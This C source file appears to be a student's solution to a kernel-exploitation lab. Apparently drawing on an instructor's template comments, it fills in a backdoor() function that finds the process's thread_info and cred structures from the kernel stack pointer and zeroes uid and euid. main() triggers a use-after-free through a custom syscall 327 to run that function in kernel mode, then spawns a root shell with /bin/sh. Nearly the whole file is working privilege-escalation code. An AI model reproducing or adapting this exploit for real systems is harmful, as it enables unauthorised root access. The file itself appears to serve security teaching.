#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
// Backdoor function
// NOTE: This function is supposed to execute in kernel space
// Therefore, you should make NO system calls or the kernel will crash
void backdoor() {
    // First, locate thread info. Check kernel source code arch/x86/include/asm/thread_info.h`
    // Note that you cannot get it directly with the system call. 

    // Next, you need to find thread_info->task->cred
    //
    // 1.  Use GDB to inspect the kernel stack and find what is the relationship between thread_info and thread_info->task->cred.
    // 2.  Note that this function is executed in the kernel that you can read/write directly.

    // Finally, you will need to rewrite the cred struct (uid and euid) and give your process highest privilege
    unsigned long sp;
    asm("mov %%rsp,%0" : "=g" (sp));

    /*void* thread_info = (sp & ~(16384 - 1));
    void *addr, *addr1;

    addr = (void*)(*((unsigned long*)(thread_info)));
  
    void *task_addr, *cred_addr;

    task_addr = addr;

    addr1 = (void*)(*((unsigned long*)(task_addr + 1456)));

    cred_addr = addr1;

    long* uid_addr, euid_addr;
    
    uid_addr = cred_addr + 4;
    euid_addr = cred_addr + 20;
    
    long* p = uid_addr;
    for(int i = 0; i < 4; ++i) {
        *p = 0;
        ++p;
    }

    p = euid_addr;
    for(int i = 0; i < 4; ++i) {
        *p = 0;
        ++p;
    }
    */

    ////long thread_info_addr = (sp & ~(16384 - 1));
    void *thread_info_addr = (sp & ~(16384 - 1));  //clearing the least significant 14 bits;
                                                   //since task offset is 0 and task is a pointer, thread_info_addr is a pointer the moment
    //long* temp = (void*)thread_info_addr;
    ////long* temp = *thread_info_addr;  //use long since the system is 8 bytes and int is only 4;
                                         //used for dereferencing the 8 byte address at thread_info_addr pointer 

    //long task_upper, task_lower, cred_upper, cred_lower;  //using long instead of int means no need to add upper/lower bytes
    void *task_addr, *cred_addr;
    long *uid_addr, *euid_addr;

    task_addr = (void*)(*((unsigned long*)(thread_info_addr))); //task pointer dereferenced to addreaa of thread_info_addr
    //task_addr = *thread_info_addr;
    ////task_addr = *temp;
    //task_upper = *(temp);     //first 4 bytes of task pointer
    //task_lower = *(temp + 4); //last 4 bytes of task pointer
    //task_addr = (task_lower << 32) | task_upper; //with 8 bytes there is no need for little-end

    cred_addr = (void*)(*((unsigned long*)(task_addr + 1456))); //since (task_addr + 1456) is a pointer, it must be dereferenced to get its address.
    ////cred_addr = *((long*)(task_addr + 1456));       //since (task_addr + 1456) is a pointer, it must be dereferenced to get its address.
    //cred_upper = *(temp2 + 1456);
    //cred_lower = *(temp2 + 1456 + 4);
    //cred_addr = (cred_lower << 32) | cred_upper;

    uid_addr = cred_addr + 4;
    euid_addr = cred_addr + 20;

    long *ptr1, *ptr2;  //pointers for accessing the data of uid/euid

    for(int i = 0; i < 4; i++) {
        ptr1 = uid_addr + i; //directly accesses the address; ptr1 is still a pointer but here it stores the address of uid
        *ptr1 = 0;      //dereference pointer and assign ID as 0
    }

    for(int i = 0; i < 4; i++) {
        ptr2 = euid_addr + i;
        *ptr2 = 0;
    }

    //Note: every time you access an address of an object but object is pointer, it must be dereferenced to get actual address. Dereference -> *ptr accesses data at address the pointer is pointing to.
    return;
}

int main() {
    // Initial getuid(), should return non zero
    fprintf(stderr, "getuid() = %d\n", getuid());
    fprintf(stderr,"geteuid() = %d\n",geteuid());
    // Run the exploit    
    // You will need to use provided system calls to execute the backdoor() function in kernel mode 
    syscall(327, 1, NULL);      //allocate object 1 with pointer po1 pointing to it.
    syscall(327, 2, NULL);      //free the previously called object
    syscall(327, 3, &backdoor);         //allocate object 2 and address of backdoor as the data
    syscall(327, 4, NULL);      //check if object 1's field pointer exists, we get the function pointer and execute the function

    fprintf(stderr, "getuid() = %d\n", getuid());
    fprintf(stderr,"geteuid() = %d\n",geteuid());
    if (getuid() == 0&&geteuid()==0) {
        fprintf(stderr, "Trying to get a root shell.\n");
        char * sharg[] = {"/bin/sh", NULL};
        execv("/bin/sh", sharg); // You should see '#' at this point
    }

    return 0;
}
